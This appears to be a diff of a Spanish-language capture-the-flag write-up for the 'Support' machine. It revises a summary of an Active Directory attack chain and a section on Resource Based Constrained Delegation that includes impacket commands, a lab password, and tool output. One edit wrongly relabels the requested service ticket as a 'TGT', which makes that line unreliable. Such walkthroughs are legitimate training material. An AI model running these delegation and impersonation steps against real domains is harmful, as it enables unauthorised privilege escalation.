@@ -1,7 +1,6 @@
 ---
 title: Support
-description: Support es una máquina Windows de dificultad fácil que presenta recursos compartidos SMB, que permite la autenticación anónima. Después de conectarse al recurso, se descubre un archivo ejecutable que se utiliza para consultar el servidor LDAP de la máquina para los usuarios disponibles. A través de ingeniería inversa, el análisis de red o la emulación, se identifica la contraseña que el binario utiliza para vincular el servidor LDAP y se puede utilizar para hacer más consultas LDAP. Se identifica un usuario llamado support en la lista de usuarios, y se encuentra que el campo de información contiene su contraseña, lo que permite una conexión WinRM a la máquina. Una vez en la máquina, la información del dominio se puede recopilar a través de Sharphound, y Bloodhound revela que el grupo de cuentas de soporte compartido del que el usuario support es miembro tiene privilegios genéricos en el controlador de dominio. Se realiza un ataque de delegación restringido basado en recursos y se recibe un shell como NT Authority\System.
-date: 2025-04-07
+description: Support es una máquina Windows de dificultad fácil que presenta un recurso compartido SMB con autenticación anónima habilitada. Tras conectarse al recurso, se descubre un archivo ejecutable que se utiliza para consultar el servidor LDAP de la máquina en busca de usuarios disponibles. Mediante reverse engineering, análisis de red o emulación, se identifica la contraseña que el binario utiliza para hacer bind al servidor LDAP, lo que permite realizar consultas adicionales. En la lista de usuarios se identifica un usuario llamado support, y en el campo info se encuentra su contraseña, lo que permite establecer una conexión WinRM con la máquina. Una vez dentro, se puede recolectar información del dominio usando SharpHound, y BloodHound revela que el grupo Shared Support Accounts, al que pertenece el usuario support, tiene privilegios GenericAll sobre el Domain Controller. Se lleva a cabo un ataque de Resource Based Constrained Delegation, y se obtiene una shell como NT AUTHORITY\SYSTEM.
 toc: true
 pin: false
 image:
@@ -356,7 +355,7 @@ Descargo la herramienta [tothi-rbcd-attack](https://github.com/tothi/rbcd-attack
 /home/kali/Documents/htb/machines/support:-$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/refs/heads/master/rbcd.py /home/kali/Documents/tools/
 ```
 
-Utilizo impacket-addcomputer para crear un objeto de tipo computadora `evilcomputer$` dentro del dominio `support.htb`. Este objeto actuará como entidad controlada por el atacante, desde la cual se ejecutará la delegación. Este paso es esencial para el ataque RBCD, ya que el equipo falso será el autorizado para suplantar identidades contra la máquina objetivo.
+Utilizo impacket-addcomputer para crear un objeto de tipo computadora `evilcomputer$` dentro del dominio `support.htb`. Este objeto actuará como entidad controlada por el atacante, desde la cual se ejecutará la delegación. Este equipo falso será el autorizado para suplantar identidades contra la máquina objetivo.
 
 ```terminal
 /home/kali/Documents/htb/machines/support:-$ impacket-addcomputer -computer-name 'evilcomputer' -computer-pass ev1lP@sS -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful
@@ -382,7 +381,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] EVILCOMPUTER$ can now impersonate users on dc$ via S4U2Proxy
 ```
 
-Solicito un TGS para que me permita impersonar al usuario `Administrator` frente al servicio CIFS de `dc.support.htb`.
+Solicito un TGT para que me permita impersonar al usuario `Administrator` frente al servicio CIFS de `dc.support.htb`.
 
 ```terminal
 /home/kali/Documents/htb/machines/support:-$ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/EVILCOMPUTER$:ev1lP@sS
